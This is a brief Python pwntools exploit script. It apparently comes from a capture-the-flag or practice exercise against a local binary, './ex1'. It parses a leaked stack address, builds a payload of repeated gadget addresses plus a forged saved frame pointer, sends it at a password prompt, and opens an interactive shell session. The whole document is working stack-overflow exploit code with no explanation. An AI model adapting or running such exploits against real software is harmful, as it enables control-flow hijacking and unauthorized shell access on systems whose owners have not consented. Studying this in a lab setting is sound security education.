from pwn import *
p = process('./ex1')
sleep(0.5)
### Gadget
spawn_addr = 0x80492b6


### Exploit
# stage 1
stack_addr = int(p.recvline()[-11:-1],16)
log.info("Stack_addr : {}".format(hex(stack_addr)))

# stage 2
pay = p32(spawn_addr+0x4)*10
pay += p32(stack_addr-0x6C) # SFP
raw_input()
p.sendafter("What is your password: ",pay)

p.interactive()
